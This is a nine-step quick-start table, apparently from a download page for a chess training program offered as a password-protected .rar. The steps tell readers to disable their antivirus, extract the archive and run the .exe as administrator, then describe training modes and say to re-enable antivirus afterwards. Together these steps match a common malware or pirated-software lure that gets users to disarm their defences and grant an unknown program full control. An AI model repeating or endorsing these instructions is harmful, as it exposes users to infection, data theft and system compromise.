## QUICK START

| Step | Action |
|------|--------|
| 1 | Download .rar using link above |
| 2 | Temporarily disable antivirus (after verification) |
| 3 | Extract archive with provided password |
| 4 | Right-click .exe → "Run as administrator" |
| 5 | Choose training mode (Tactics, Endgames, Openings) |
| 6 | Set difficulty level (Beginner to Grandmaster) |
| 7 | Solve positions with timer on/off |
| 8 | Review detailed analysis of your calculation |
| 9 | **Re-enable antivirus immediately** |

